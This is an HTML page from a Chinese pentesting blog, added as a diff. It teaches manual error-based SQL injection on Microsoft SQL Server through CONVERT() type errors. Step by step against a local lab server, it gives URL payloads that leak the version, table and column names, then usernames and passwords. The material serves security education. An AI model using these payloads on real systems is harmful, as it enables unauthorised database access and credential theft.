@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>Microsoft SQL Server手注之报错注入 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Microsoft SQL Server手注之报错注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 12, 2020&nbsp;&nbsp;12:01:51</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>今天主要分享下<code>sql</code>注入中的<code>报错型</code>，在大多网上的文章会列出类似于公式的句子，却没解释为什么要使用这样的函数，为什么使用这个函数会出现报错而导致sql注入。</p>
+<p><code>convert()</code>函数,<code>CONVERT() </code>函数是把⽇期转换为新数据类型的通⽤函数。</p>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">注释 ：</span><br><span class="line">data_type(length) 转换为⽬标数据类型（带有可选的长度）。</span><br><span class="line">data_to_be_converted 含有需要转换的值。</span><br><span class="line">style 规定⽇期/时间的输出格式。</span><br></pre></td></tr></table></figure>
+
+<p>⽰例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(VARCHAR(19),GETDATE())</span><br><span class="line">CONVERT(VARCHAR(10),GETDATE(),110) </span><br><span class="line">CONVERT(VARCHAR(11),GETDATE(),106)</span><br><span class="line">CONVERT(VARCHAR(24),GETDATE(),113)</span><br></pre></td></tr></table></figure>
+
+<p>结果类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dec 29 2008 11:45 PM</span><br><span class="line">12-29-2008</span><br><span class="line">29 Dec 08</span><br><span class="line">29 Dec 2008 16:25:46.635</span><br></pre></td></tr></table></figure>
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>对于 <code>convert(int,@@version)</code>，<code>convert</code> 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为<code>int</code>类型。但是，由于这个SQL查询的结果是<code>varchar</code>类型，⽆法进⾏指定的转换，所以，<code>convert</code>函数会抛出 ⼀个<code>SQL server</code>错误消息，指出“SQL查询结果”⽆法转换为<code>“int”</code>类型，这样的话，攻击者就能得到的这个SQL查询的结果了。 </p>
+<p>满⾜条件的函数还有很多：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">convert() </span><br><span class="line">file_name() </span><br><span class="line">db_name() </span><br><span class="line">col_name() </span><br><span class="line">filegroup_name()</span><br><span class="line">object_name() </span><br><span class="line">schema_name() </span><br><span class="line">type_name() </span><br><span class="line">cast()</span><br></pre></td></tr></table></figure>
+
+<h2 id="注⼊流程"><a href="#注⼊流程" class="headerlink" title="注⼊流程"></a>注⼊流程</h2><h3 id="查询基本信息"><a href="#查询基本信息" class="headerlink" title="查询基本信息"></a>查询基本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">convert(int,@@version) 		获取版本信息 </span><br><span class="line">convert(int,db_name()) 		数据库名字 </span><br><span class="line">convert(int,user)			当前⽤户名 </span><br><span class="line">convert(int,@@SERVERNAME)	获取有关服务器主机的信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,@@version) </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1412.png" alt="图片"></p>
+<p>注意在这里我们直接吧函数放到 <code>id=</code> 的后面，因为 <code>id=1</code> 查询的是整型（<code>int</code>），而我们的 <code>convert(int,@@version)</code> 获取到的版本信息是<code>字符型</code>，所以他就会报错，从而爆出版本信息！</p>
+<p>或者也可以使用这条语句也能实现上面的查询结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(convert(int,@@version))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1413.png" alt="图片"></p>
+<h3 id="获取当前数据库的表名"><a href="#获取当前数据库的表名" class="headerlink" title="获取当前数据库的表名"></a>获取当前数据库的表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(int,(select top 1 table_name from information_schema.columns))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=CONVERT(int,(select top 1 table_name from information_schema.columns))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1414.png" alt="图片"></p>
+<p>我们获取到了当前网站数据库的表名是：<code>users</code>！</p>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(16进制的表名 as varchar)))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273  as varchar)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1415.png" alt="图片"></p>
+<p>这样我们就获取到了第一个列名 <code>id</code>！</p>
+<p>那么想要获取第二个列名我们就可以再后面加一个条件语句：<code>and COLUMN_NAME != &#39;id&#39;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar) and COLUMN_NAME != &#x27;id&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1416.png" alt="图片"></p>
+<p>这样我们就获取到了第二个列名：<code>username</code> ！</p>
+<p>想要获取第三个也是以此类推加条件语句：<code>and COLUMN_NAME != &#39;username&#39;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar) and COLUMN_NAME != &#x27;id&#x27; and COLUMN_NAME != &#x27;username&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1417.png" alt="图片"></p>
+<p>这样我们就获取到了第三个列名 <code>password</code> ！</p>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>我们按照上面的顺序获取到了网站的表名：<code>users</code>，列名有：<code>id</code>、<code>username</code>、<code>password</code>。很明显账号密码就在列名的<code>username</code>、<code>password</code>，那么我们就可以获取数据了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert(int,(select top 1 列名 from 表名))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 username from users))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1418.png" alt="图片"></p>
+<p>获取到了第一个<code>username</code>列名的第一个数据：<code>saul</code>！</p>
+<p>如果想获取到 <code>username</code> 里面的第二个数据那么就加一个条件语句：<code>where username!=&#39;saul&#39;</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 username from users where username!=&#x27;saul&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1419.png" alt="图片"></p>
+<p>这样就获取到的 <code>username</code> 的第二个数据！想要获取第二个就以此类推！</p>
+<p>既然 <code>username</code> 我们获取到了两个：<code>saul</code>、<code>admin</code>！那么我们就要获取到他们的密码了！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 password from users))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1420.png" alt="图片"></p>
+<p>获取到第一个 <code>password</code> 列的值为：<code>saul520</code>！</p>
+<p>想要获取下一个就加一个 <code>where</code> 条件语句：<code>where password!=&#39;saul520&#39;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 password from users where password!=&#x27;saul520&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1421.png" alt="图片"></p>
+<p>这样就获取到了第二个<code>password</code>的数据了！</p>
+<p>至此<code>Mssql</code>的<code>报错注入</code>就到此为止！</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/03/12/SQL-MsSQL-2/">http://example.com/2020/03/12/SQL-MsSQL-2/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/MsSQL/"># MsSQL</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/03/12/SQL-MsSQL-3/">Microsoft SQL Server手注之布尔型盲注</a>
+            
+            
+            <a class="next" rel="next" href="/2020/03/12/SQL-MsSQL-1/">Microsoft SQL Server手注之联合查询注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
